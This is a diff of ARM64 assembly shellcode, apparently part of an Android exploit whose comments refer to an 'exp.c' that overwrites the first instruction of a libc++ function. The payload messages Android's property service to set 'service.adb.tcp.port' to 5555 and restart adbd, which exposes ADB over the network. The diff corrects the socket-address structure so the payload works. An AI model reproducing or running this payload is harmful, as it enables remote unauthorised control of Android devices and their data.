@@ -14,12 +14,15 @@ libcxx_data:
 
 mutex_file:
     .asciz "/dev/df"
-sockaddr_un:
-    .word 1  // AF_UNIX
-    .asciz "/dev/socket/property_service"
-    .skip 80, 0 // 补齐 sockaddr_un 结构体大小
 
-// 属性服务协议包 1: PROP_MSG_SETPROP2 (1) | klen(21) | "service.adb.tcp.port" | vlen(4) | "5555"
+// 修复后的 sockaddr_un 结构体
+sockaddr_un:
+    .byte 1, 0  // AF_UNIX (占2字节)
+    .asciz "/dev/socket/property_service"
+    .skip 79, 0 // 补齐到 110 字节 (2 + 29 + 79 = 110)
+    .balign 4
+
+// 属性服务协议包 1: cmd(1) | klen(21) | "service.adb.tcp.port" | vlen(4) | "5555"
 msg1:
     .word 0x00000001
     .word 21
@@ -27,7 +30,7 @@ msg1:
     .word 4
     .ascii "5555"
 
-// 属性服务协议包 2: PROP_MSG_SETPROP2 (1) | klen(11) | "ctl.restart" | vlen(4) | "adbd"
+// 属性服务协议包 2: cmd(1) | klen(11) | "ctl.restart" | vlen(4) | "adbd"
 msg2:
     .word 0x00000001
     .word 11
@@ -150,7 +153,9 @@ return:
     ldp x4, x5, [sp], #16
     ldp x2, x3, [sp], #16
     ldp x0, x1, [sp], #16
+
 libcxx_first_inst_copy:
+    // 原函数第一条指令，供 exp.c 覆盖
     stp     x29, x30, [sp, #-32]!
     b       end
 end:
